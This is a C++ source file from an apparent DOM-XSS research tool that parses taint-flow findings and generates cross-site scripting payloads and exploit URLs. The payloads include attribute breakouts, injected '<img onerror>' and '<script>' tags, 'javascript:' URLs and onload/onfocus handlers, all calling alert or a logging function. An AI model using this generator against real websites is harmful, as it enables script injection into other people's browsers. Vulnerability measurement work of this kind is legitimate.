#include "Metadata.hpp"
#include <iostream>
#include <sstream>
#include <regex>

namespace {
    Exploit_Method method_of_string(const std::string &method) {
        if (method == "A") {
            return A;
        } if (method == "B") {
            return B;
        } if (method == "C") {
            return C;
        }
        return Unknown;

    }
    Exploit_Status status_of_string(const std::string &status) {
        if (status == "validated") {
            return Validated;
        } if (status == "in_validation") {
            return In_Validation;
        }
        return Error;

    }

    Exploit_Type type_of_string(const std::string &type) {
        if (type == "html") {
            return Html;
        }
        if (type == "js") {
            return JavaScript;
        }
        return Undefined;
    }

    bool bool_of_string(const std::string& value) {
        return value == "true";
    }
}
Metadata::Metadata()
    : uuid(),
    url(),
    sink(),
    source(),
    sanitizer_score(0),
    taint_range_index(0),
    start_index(0),
    end_index(0),
    initialized(false),
    exploit_method(Unknown),
    exploit_status(Error),
    exploit_type(Undefined),
    hash(0),
    sanitizer_hash(0),
    twenty_five_million_flows_id(0),
    domain(),
    valid_exploit(false),
    break_in(),
    break_out(),
    payload() {

}

std::string Metadata::get_uuid() const {
    return this->uuid;
}

std::string Metadata::get_url() const {
    return this->url;
}

std::string Metadata::get_comma_escaped_url() const {
    std::string encoded(this->url);
    replaceAll(encoded, ",", "%2C");
    return encoded;
}

std::string Metadata::get_sink() const {
    return this->sink;
}

std::string Metadata::get_source() const {
    return this->source;
}

int Metadata::get_sanitizer_score() const {
    return this->sanitizer_score;
}

int Metadata::get_taint_range_index() const {
    return this->taint_range_index;
}

int Metadata::get_start_index() const {
    return this->start_index;
}


int Metadata::get_end_index() const {
    return this->end_index;
}


bool Metadata::is_initialized() const {
    return this->initialized;
}

bool Metadata::set_field(const std::string& key, const std::string& value) {
    if(key == "Finding") {
        this->initialized = true;
        this->uuid = value;
        return true;
    }
    if(key == "Finding.url") {
        this->initialized = true;
        this->url = value;
        return true;
    }
    if(key == "Finding.sink") {
        this->initialized = true;
        this->sink = value;
        return true;
    }
    if(key == "Finding.source") {
        this->initialized = true;
        this->source = value;
        return true;
    }
    if(key == "Finding.begin") {
        this->start_index = std::stoi(value);
        this->initialized = true;
        return true;
    }
    if(key == "Finding.end") {
        this->end_index = std::stoi(value);
        this->initialized = true;
        return true;
    }
    if(key == "Finding.script") {
        this->initialized = true;
        this->script = value;
        return true;
    }
    if(key == "Sanitizer.score") {
        this->sanitizer_score = std::stoi(value);
        this->initialized = true;
        return true;
    }
    if(key == "Finding.line") {
        this->line = std::stoi(value);
        this->initialized = true;
        return true;
    }
    if(key == "Finding.original_uuid") {
        this->original_uuid = value;
        this->initialized = true;
        return true;
    }
    if(key == "Exploit.uuid") {
        this->exploit_uuid = value;
        this->initialized = true;
        this->valid_exploit = true;
        return true;
    }
    if(key == "Exploit.success") {
        this->exploit_success = ::bool_of_string(value);
        this->initialized = true;
        this->valid_exploit = true;
        return true;
    }
    if(key == "Exploit.method") {
        this->exploit_method = ::method_of_string(value);
        this->initialized = true;
        this->valid_exploit = true;
        return true;
    }
    if(key == "Exploit.status") {
        this->exploit_status = ::status_of_string(value);
        this->initialized = true;
        this->valid_exploit = true;
        return true;
    }
    if(key == "Exploit.type") {
        this->exploit_type = ::type_of_string(value);
        this->initialized = true;
        this->valid_exploit = true;
        return true;
    }
    if(key == "DepGraph.hash") {
        this->hash = std::stoi(value);
        this->initialized = true;
        return true;
    }
    if(key == "DepGraph.sanitizer_hash") {
        this->sanitizer_hash = std::stoi(value);
        this->initialized = true;
        return true;
    }
    if(key == "Finding.TwentyFiveMillionFlowsId") {
        this->twenty_five_million_flows_id = std::stoi(value);
        this->initialized = true;
        return true;
    }
    if(key == "Exploit.begin_taint_url") {
        this->begin_taint_url = std::stoi(value);
        this->initialized = true;
        return true;
    }
    if(key == "Exploit.end_taint_url") {
        this->end_taint_url = std::stoi(value);
        this->initialized = true;
        return true;
    }
    if(key == "Exploit.replace_begin_url") {
        this->replace_begin_url = std::stoi(value);
        this->initialized = true;
        return true;
    }
    if(key == "Exploit.replace_end_url") {
        this->replace_end_url = std::stoi(value);
        this->initialized = true;
        return true;
    }
    if(key == "Exploit.replace_begin_param") {
        this->replace_begin_param = std::stoi(value);
        this->initialized = true;
        return true;
    }
    if(key == "Exploit.replace_end_param") {
        this->replace_end_param = std::stoi(value);
        this->initialized = true;
        return true;
    }
    if(key == "Finding.domain") {
        this->domain = value;
        this->initialized = true;
        return true;
    }
    if(key == "Exploit.token") {
        this->exploit_token = value;
        this->initialized = true;
        this->valid_exploit = true;
        return true;
    }
    if(key == "Exploit.content") {
        this->exploit_content = value;
        this->initialized = true;
        this->valid_exploit = true;
        return true;
    }
    if(key == "Exploit.tag") {
        this->exploit_tag = value;
        this->initialized = true;
        this->valid_exploit = true;
        return true;
    }
    if(key == "Exploit.quote_type") {
        this->exploit_quote_type = value;
        this->initialized = true;
        this->valid_exploit = true;
        return true;
    }
    if(key == "Exploit.break_in") {
        this->break_in = value;
        this->initialized = true;
        this->valid_exploit = true;
        return true;
    }
    if(key == "Exploit.break_out") {
        this->break_out = value;
        this->initialized = true;
        this->valid_exploit = true;
        return true;
    }
    if(key == "Exploit.payload") {
        this->payload = value;
        this->initialized = true;
        this->valid_exploit = true;
        return true;
    }
    if(key == "Issues.LargestEncodeAttrStringChain") {
        this->max_encode_attr_chain_length = std::stoi(value);
        this->initialized = true;
        return true;
    }
    if(key == "Issues.LargestTextFragmentEncodeChainLength") {
        this->max_encode_text_fragment_chain_length = std::stoi(value);
        this->initialized = true;
        return true;
    }
    if(key == "Issues.HasApproximation") {
        this->approximated_method = ::bool_of_string(value);
        this->initialized = true;
        return true;
    }
    if(key == "Issues.HasMissingImplementation") {
        this->unsupported_method = ::bool_of_string(value);
        this->initialized = true;
        return true;
    }
    if(key == "Issues.HasInfiniteRegexWithFunctionReplacer") {
        this->infinite_regex = ::bool_of_string(value);
        this->initialized = true;
        return true;
    }
    if(key == "Issues.HasUrlInRhsOfReplace") {
        this->url_on_rhs_of_replace = ::bool_of_string(value);
        this->initialized = true;
        return true;
    }
    if(key == "Issues.RemovedLRConcats") {
        this->removed_lr_concats = ::bool_of_string(value);
        this->initialized = true;
        return true;
    }
    if(key == "Issues.RemovedReplaceArtifacts") {
        this->removed_replace_artifacts = ::bool_of_string(value);
        this->initialized = true;
        return true;
    }
    std::cout << "key value pair: (" << key << ", " << value << ") unknown!\n";
    return false;

}

void Metadata::to_dot(std::stringstream &ss) const {
    ss << "// Finding: " << this->uuid << "\n";
    ss << "// Finding.url: " << this->url << "\n";
    ss << "// Finding.sink: " << this->sink << "\n";
    ss << "// Finding.source: " << this->source << "\n";
    ss << "// Finding.begin: " << this->start_index << "\n";
    ss << "// Finding.end: " << this->end_index << "\n";
    ss << "// Finding.original_uuid: " << this->original_uuid << "\n";
    ss << "// Finding.script: " << this->script << "\n";
    ss << "// Finding.line: " << this->line << "\n";

}

const std::string &Metadata::get_exploit_uuid() const {
    return exploit_uuid;
}

bool Metadata::is_exploit_successful() const {
    return exploit_success;
}

Exploit_Method Metadata::get_exploit_method() const {
    return exploit_method;
}

Exploit_Status Metadata::get_exploit_status() const {
    return exploit_status;
}

Exploit_Type Metadata::get_exploit_type() const {
    return exploit_type;
}

const std::string &Metadata::get_exploit_content() const {
    return exploit_content;
}

const std::string &Metadata::get_exploit_token() const {
    return exploit_token;
}

const std::string &Metadata::get_exploit_tag() const {
    return exploit_tag;
}

const std::string &Metadata::get_exploit_quote_type() const {
    return exploit_quote_type;
}

int Metadata::get_hash() const {
    return this->hash;
}

const std::string &Metadata::get_script() const {
    return this->script;
}

int Metadata::get_line() const {
    return this->line;
}

std::string Metadata::get_original_uuid() const {
    return this->original_uuid;
}

std::string Metadata::get_domain() const {
    return this->domain;
}

int Metadata::get_twenty_five_million_flows_id() const {
    return this->twenty_five_million_flows_id;
}

int Metadata::get_sanitizer_hash() const {
    return this->sanitizer_hash;
}

bool Metadata::has_valid_exploit() const {
    return this->valid_exploit;
}

std::string Metadata::get_break_out() const {
    return this->break_out;
}

std::string Metadata::get_break_in() const {
    return this->break_in;
}

std::string Metadata::get_payload() const {
    return this->payload;
}

int Metadata::get_max_encode_attr_chain_length() const {
    return this->max_encode_attr_chain_length;
}

int Metadata::get_max_encode_text_fragment_chain_length() const {
    return this->max_encode_text_fragment_chain_length;
}

bool Metadata::has_approximated_method() const {
    return this->approximated_method;
}
bool Metadata::has_unsupported_method() const {
    return this->unsupported_method;
}
bool Metadata::has_infinite_regex() const {
    return this->infinite_regex;
}
bool Metadata::has_url_on_rhs_of_replace() const {
    return this->url_on_rhs_of_replace;
}
bool Metadata::has_removed_lr_concats() const {
    return this->removed_lr_concats;
}
bool Metadata::has_removed_replace_artifacts() const {
    return this->removed_replace_artifacts;
}
std::string Metadata::generate_exploit_from_scratch() const {
    std::string alert = "alert(1)";
    return generate_exploit_from_scratch(alert);
}

std::string Metadata::generate_exploit_from_scratch(const std::string &function) const {
        // // Try to generate an attribute payload on the fly:
        // // Exploit.success: false
        // // Exploit.status: failure
        // // Exploit.method: C
        // // Exploit.type: html
        // // Exploit.token: attribute
        // // Exploit.content: src
        // // Exploit.quote_type: '
        // // Exploit.tag: script
    std::string payload = "";
    if (is_initialized()) {
        if (has_valid_exploit()) {
            if (get_exploit_type() == Exploit_Type::Html) {
                if (get_exploit_token() == "attribute") {
                    // Need to break out of attribute
                    payload += get_exploit_quote_type();
                    payload += ">";
                }
                // Now break out of non-executing contexts
                // payload += "</iframe></style></script></object></embed></textarea>";
                //payload += "</iframe></script>";
                // Add execution tags
                if ((get_sink() == "innerHTML") ||
                    (get_sink() == "outerHTML") ||
                    (get_sink() == "insertAdjacentHTML")) {
                    payload += "<img src=x onerror=";
                } else {
                    payload += "<script>";
                }
                payload += function;
                if ((get_sink() == "innerHTML") ||
                    (get_sink() == "outerHTML") ||
                    (get_sink() == "insertAdjacentHTML")) {
                    payload += "><!--/*";
                } else {
                    payload += "</script><!--/*";
                }
            }
        } else if ((get_sink() == "track.src")  ||
                   (get_sink() == "script.src") ||
                   (get_sink() == "object.data")||
                   (get_sink() == "media.src")  ||
                   (get_sink() == "embed.src")  ||
                   (get_sink() == "img.src")    ||
                   (get_sink() == "imgset.src") ||
                   (get_sink() == "iframe.src")) {
            // See if we can generate a URL payload
            if (get_start_index() == 0) { // Can only exploit if we control the start of the string
                payload += "javascript:";
                payload += function;
                payload += "//";
            }
        } else {
            // Fall back to existing payload for e.g. Javascript
            payload = get_generated_exploit();
        }
    }
    return payload;
}

std::string Metadata::generate_attribute_exploit_from_scratch() const {
    std::string payload = "";
    std::string function = "alert(1)";
    if (is_initialized() && has_valid_exploit() &&
        (get_exploit_type() == Exploit_Type::Html) &&
        (get_exploit_token() == "attribute")) {
        // only certain tags use onload:
        if ((get_exploit_tag() == "body")   ||
            (get_exploit_tag() == "iframe") ||
            (get_exploit_tag() == "img")    ||
            (get_exploit_tag() == "input")  ||
            (get_exploit_tag() == "link")   ||
            (get_exploit_tag() == "script") ||
            (get_exploit_tag() == "style")) {
            // Need to break out of attribute
            payload += get_exploit_quote_type();
            // insert event handlers
            payload += " onload=" + function;
            payload += " onerror=" + function;
            // Create new attribute
            payload += " foo=";
            payload += get_exploit_quote_type();
        } else if (get_exploit_tag() == "input") {
            // Trickery
            // Need to break out of attribute
            payload += get_exploit_quote_type();
            // insert event handlers
            payload += " onfocus=" + function;
            // Create new attribute
            payload += " autofocus foo=";
            payload += get_exploit_quote_type();
        }
    }
    return payload;
}

#define URI_ENCODE_CHARS 256

static const char encodeUriComponentChars[URI_ENCODE_CHARS] =
//   0    1    2    3    4    5    6    7    8    9    A    B    C    D    E    F
{
    1,   1,   1,   1,   1,   1,   1,   1,   1,   1,   1,   1,   1,   1,   1,   1,  // 0x
    1,   1,   1,   1,   1,   1,   1,   1,   1,   1,   1,   1,   1,   1,   1,   1,  // 1x
    1,   0,   1,   1,   1,   1,   1,   0,   0,   0,   0,   1,   1,   0,   0,   1,  // 2x   !"#$%&'()*+,-./
    0,   0,   0,   0,   0,   0,   0,   0,   0,   0,   1,   1,   1,   1,   1,   1,  // 3x  0123456789:;<=>?
    1,   0,   0,   0,   0,   0,   0,   0,   0,   0,   0,   0,   0,   0,   0,   0,  // 4x  @ABCDEFGHIJKLMNO
    0,   0,   0,   0,   0,   0,   0,   0,   0,   0,   0,   1,   1,   1,   1,   0,  // 5x  PQRSTUVWXYZ[\]^_
    1,   0,   0,   0,   0,   0,   0,   0,   0,   0,   0,   0,   0,   0,   0,   0,  // 6x  `abcdefghijklmno
    0,   0,   0,   0,   0,   0,   0,   0,   0,   0,   0,   1,   1,   1,   0,   1,  // 7x  pqrstuvwxyz{|}~ DEL
    1,   1,   1,   1,   1,   1,   1,   1,   1,   1,   1,   1,   1,   1,   1,   1,  // 8x
    1,   1,   1,   1,   1,   1,   1,   1,   1,   1,   1,   1,   1,   1,   1,   1,  // 9x
    1,   1,   1,   1,   1,   1,   1,   1,   1,   1,   1,   1,   1,   1,   1,   1,  // ax
    1,   1,   1,   1,   1,   1,   1,   1,   1,   1,   1,   1,   1,   1,   1,   1,  // bx
    1,   1,   1,   1,   1,   1,   1,   1,   1,   1,   1,   1,   1,   1,   1,   1,  // cx
    1,   1,   1,   1,   1,   1,   1,   1,   1,   1,   1,   1,   1,   1,   1,   1,  // dx
    1,   1,   1,   1,   1,   1,   1,   1,   1,   1,   1,   1,   1,   1,   1,   1,  // ex
    1,   1,   1,   1,   1,   1,   1,   1,   1,   1,   1,   1,   1,   1,   1,   0,  // fx  // insertIntoStatePairSortedArrayList asserts if escapeChar = 255
};

std::string Metadata::UriEncode(const std::string & sSrc)
{
    const char DEC2HEX[16 + 1] = "0123456789ABCDEF";
    const unsigned char * pSrc = (const unsigned char *)sSrc.c_str();
    const int SRC_LEN = sSrc.length();
    unsigned char * const pStart = new unsigned char[SRC_LEN * 3];
    unsigned char * pEnd = pStart;
    const unsigned char * const SRC_END = pSrc + SRC_LEN;

    for (; pSrc < SRC_END; ++pSrc)
    {
        if (!encodeUriComponentChars[*pSrc])
            *pEnd++ = *pSrc;
        else
        {
            // escape this char
            *pEnd++ = '%';
            *pEnd++ = DEC2HEX[*pSrc >> 4];
            *pEnd++ = DEC2HEX[*pSrc & 0x0F];
        }
    }

    std::string sResult((char *)pStart, (char *)pEnd);
    delete [] pStart;
    return sResult;
}

bool Metadata::replaceAll( std::string &s, const std::string &search, const std::string &replace )
{
    bool replaced = false;
    for( size_t pos = 0; ; pos += replace.length() ) {
        // Locate the substring to replace
        pos = s.find( search, pos );
        if( pos == std::string::npos ) break;
        // Replace by erasing and inserting
        replaced = true;
        s.erase( pos, search.length() );
        s.insert( pos, replace );
    }
    return replaced;
}

std::string Metadata::generate_exploit_url(const std::string& payload) const
{
    if (payload == "") {
        return "";
    }

    std::string url = get_comma_escaped_url();
    std::string original_payload = get_payload();
    std::string uuid_without_dashes = std::regex_replace(get_exploit_uuid(), std::regex("-"), "");

    if (original_payload == "") {
        original_payload = generate_exploit_from_scratch("taintfoxLog('" + uuid_without_dashes + "')");
    } else {
        original_payload = std::regex_replace(original_payload, std::regex("taintfoxLog\\(1\\)"), "taintfoxLog('" + uuid_without_dashes + "')");
    }

    // Get URL encoded string
    std::string encoded_payload = UriEncode(original_payload);
    std::string double_encoded_payload = UriEncode(encoded_payload);

    // Try replacing the original payload with our new one
    size_t payload_pos = url.find(original_payload);
    size_t encoded_payload_pos = url.find(encoded_payload);
    size_t double_encoded_payload_pos = url.find(double_encoded_payload);

    // std::cout << "original: " << original_payload << " " << payload_pos << std::endl;
    // std::cout << "encoded:  " << encoded_payload << " " << encoded_payload_pos <<  std::endl;
    // std::cout << "dencoded: " << double_encoded_payload << " " << double_encoded_payload_pos << std::endl;
    // std::cout << "url:      " << url << std::endl;

    replaceAll(url, original_payload, payload);
    replaceAll(url, encoded_payload, payload);
    replaceAll(url, double_encoded_payload, payload);

    // Check if the url was changed
    // if (url == get_comma_escaped_url()) {
    //     if (url.find("#") == std::string::npos) {
    //         url += hash;
    //     }
    //     url += payload;
    // }

    std::cout << url << std::endl;
    return url;
}

std::string Metadata::get_generated_exploit() const {
    std::string payload = "";
    if (is_initialized() && has_valid_exploit()) {
        payload = get_payload();
        // Remove the closing tags if they are there...
        // payload = std::regex_replace(payload, std::regex("</iframe></style></script></object></embed></textarea>"), "");
        // payload = std::regex_replace(payload, std::regex("<!--/\\*"), "");
        payload = std::regex_replace(payload, std::regex("taintfoxLog"), "alert");
    }
    return payload;
}

void Metadata::print(std::ostream& os) const {
    os << get_uuid() << ",";
    os << get_original_uuid() << ",";
    os << get_exploit_uuid() << ",";
    os << get_sanitizer_score() << ",";
    os << get_domain() << ",";
    os << get_source() << ",";
    os << get_sink() << ",";
    os << get_hash() << ",";
    os << get_sanitizer_hash() << ",";
    os << get_twenty_five_million_flows_id() << ",";
    os << get_script() << ",";
    os << get_line() << ",";
    os << get_exploit_tag() << ",";
    os << get_exploit_token() << ",";
    os << get_exploit_quote_type() << ",";
    os << is_exploit_successful() << ",";
    os << get_exploit_status() << ",";
    os << get_payload() << ",";
    os << get_comma_escaped_url() << ",";
}

void Metadata::printHeader(std::ostream& os)
{
    os << "uuid,";
    os << "uuid_original,";
    os << "uuid_exploit,";
    os << "sanitizer_score,";
    os << "domain,";
    os << "source,";
    os << "sink,";
    os << "hash,";
    os << "sanitizer_hash,";
    os << "twenty_five_million_flows_id,";
    os << "script,";
    os << "line,";
    os << "exploit_tag,";
    os << "exploit_token,";
    os << "exploit_quote_type,";
    os << "exploit_successful,";
    os << "exploit_status,";
    os << "payload,";
    os << "url,";
}

int Metadata::get_replace_end_param() const {
    return this->replace_end_param;
}

int Metadata::get_replace_begin_param() const {
    return this->replace_begin_param;
}

int Metadata::get_replace_end_url() const {
    return this->replace_end_url;
}

int Metadata::get_replace_begin_url() const {
    return this->replace_begin_url;
}

int Metadata::get_end_taint_url() const {
    return this->end_taint_url;
}

int Metadata::get_begin_taint_url() const {
    return this->begin_taint_url;
}
